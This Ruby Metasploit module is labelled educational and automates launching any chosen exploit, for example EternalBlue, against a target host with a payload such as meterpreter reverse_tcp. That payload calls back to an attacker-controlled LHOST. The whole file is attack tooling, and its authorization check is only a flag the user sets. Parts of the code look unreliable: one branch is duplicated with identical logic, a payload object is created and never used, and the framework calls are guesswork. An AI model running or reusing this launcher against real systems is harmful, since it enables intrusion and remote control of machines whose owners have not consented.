require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Automated Exploit Launcher (educational)',
      'Description' => %q{
        Configure and programmatically launch a specified Metasploit exploit with a chosen payload.
        Designed for authorized testing and lab use only.
      },
      'Author'      => ['Jose Mayo'],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('EXPLOIT', [ true, 'Exploit module path (e.g. exploit/windows/smb/ms17_010_eternalblue)' ]),
        OptString.new('PAYLOAD', [ true, 'Payload name (e.g. windows/x64/meterpreter/reverse_tcp)' ]),
        Opt::RHOST(),
        OptAddress.new('LHOST', [ true, 'Local host (attacker) for payload callback' ]),
        OptInt.new('LPORT', [ true, 'Local port (attacker) for payload callback', 4444 ]),
        OptBool.new('CONFIRM_AUTHZ', [ true, 'Confirm you have authorization to test this target (true/false)', false ])
      ]
    )
  end

  def run
    # Safety check: ensure user confirms authorization to test the target
    unless datastore['CONFIRM_AUTHZ']
      print_error("CONFIRM_AUTHZ is not set to true. This module will not run unless you confirm you are authorized.")
      print_error("Set CONFIRM_AUTHZ true only if you have explicit permission to test the target.")
      return
    end

    exploit_path = datastore['EXPLOIT'].to_s.strip
    payload_name = datastore['PAYLOAD'].to_s.strip
    rhost        = datastore['RHOST']
    lhost        = datastore['LHOST']
    lport        = datastore['LPORT'].to_i

    if exploit_path.empty? || payload_name.empty? || rhost.nil? || lhost.nil? || lport == 0
      print_error("Missing required options. Ensure EXPLOIT, PAYLOAD, RHOST, LHOST, and LPORT are set.")
      return
    end

    print_status("Launching exploit #{exploit_path} against #{rhost} with payload #{payload_name}")
    begin
      # Create exploit module instance
      # framework.exploits.create is preferred when available
      exploit_mod = nil
      if framework.respond_to?(:exploits) && framework.exploits.respond_to?(:create)
        exploit_mod = framework.exploits.create(exploit_path)
      else
        # Fallback: try generic modules factory
        # split exploit path into components e.g. exploit/windows/smb/...
        segments = exploit_path.split('/')
        if segments.shift == 'exploit'
          exploit_mod = framework.modules.create('exploit', *segments)
        else
          exploit_mod = framework.modules.create('exploit', *segments)
        end
      end

      if exploit_mod.nil?
        print_error("Failed to create exploit module for '#{exploit_path}'. Check the module path.")
        return
      end

      # Create payload object (some MSF versions require passing payload name into exploit_simple rather than creating a payload object separately)
      payload_mod = nil
      if framework.respond_to?(:payloads) && framework.payloads.respond_to?(:create)
        payload_mod = framework.payloads.create(payload_name)
      end

      # Set exploit datastore options
      begin
        exploit_mod.datastore['RHOST'] = rhost
        # set RPORT if user provided it in exploit module options previously
        if datastore['RPORT']
          exploit_mod.datastore['RPORT'] = datastore['RPORT']
        end
      rescue ::Exception => e
        vprint_error("Failed to set exploit datastore options: #{e.class} #{e}")
      end

      # Set payload options on exploit datastore (most modules expect payload options to be in exploit.datastore)
      begin
        exploit_mod.datastore['PAYLOAD'] = payload_name
        exploit_mod.datastore['LHOST']   = lhost
        exploit_mod.datastore['LPORT']   = lport
      rescue ::Exception => e
        vprint_error("Failed to set payload options on exploit datastore: #{e.class} #{e}")
      end

      # Print summary
      print_status("Exploit: #{exploit_path}")
      print_status("Payload: #{payload_name}")
      print_status("Target RHOST: #{rhost}")
      print_status("LHOST: #{lhost}  LPORT: #{lport}")

      # Run the exploit programmatically
      print_status("Running exploit... (this may take some time depending on the module)")
      if exploit_mod.respond_to?(:exploit_simple)
        # exploit_simple usually takes a payload string or nil; API varies across MSF versions.
        begin
          exploit_mod.exploit_simple(
            'Payload'    => payload_name,
            'RunAsJob'   => true,    # attempt to run as an async job where supported
            'LocalInput' => nil,
            'LocalOutput'=> nil
          )
          print_good("Exploit launched (exploit_simple invoked). Watch the console for session output.")
        rescue ::Exception => e
          # Some framework versions expect different arguments; try a simpler call
          vprint_error("exploit_simple failed: #{e.class} #{e}")
          begin
            exploit_mod.exploit_simple('Payload' => payload_name)
            print_good("Exploit launched (fallback exploit_simple invoked).")
          rescue ::Exception => e2
            print_error("exploit_simple fallback failed: #{e2.class} #{e2}")
            print_status("Attempting to run exploit.run as last resort (may block).")
            begin
              exploit_mod.run
              print_good("Exploit run completed (exploit.run).")
            rescue ::Exception => e3
              print_error("Exploit execution failed: #{e3.class} #{e3}")
            end
          end
        end
      else
        # If exploit_simple isn't present, try calling run
        begin
          exploit_mod.run
          print_good("Exploit run completed (exploit.run).")
        rescue ::Exception => e
          print_error("Failed to execute exploit module: #{e.class} #{e}")
        end
      end

    rescue ::Exception => e
      print_error("Unexpected error while preparing exploit: #{e.class} #{e}")
      vprint_error(e.backtrace.join("\n"))
    end
  end
end
